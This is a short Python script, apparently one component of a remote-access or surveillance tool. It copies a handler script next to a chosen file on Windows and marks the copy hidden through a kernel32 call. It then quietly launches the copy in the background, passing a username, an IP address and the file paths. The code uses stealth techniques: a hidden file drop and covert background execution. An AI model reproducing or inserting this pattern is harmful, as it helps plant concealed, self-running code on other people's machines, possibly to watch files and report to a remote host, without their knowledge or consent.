import subprocess
import ctypes
import os


def main(username, path, current_folder, ip):
    if not os.path.isfile(path) and not os.path.isdir(path):
        raise FileNotFoundError(f"The file '{path}' does not exist.")
    
    file_to_copy = 'modify_handler.py'
    with open(f"Pages\{file_to_copy}", 'r') as file:
        script = file.read()

    parent_dir = os.path.dirname(path)
    filepath = os.path.join(parent_dir, file_to_copy)

    if os.path.isfile(filepath):
        return
    
    with open(filepath, 'w') as file:
        file.write(script)

    ret = ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x02)
    subprocess.Popen(["python", file_to_copy, username, ip, path, current_folder], cwd=parent_dir)
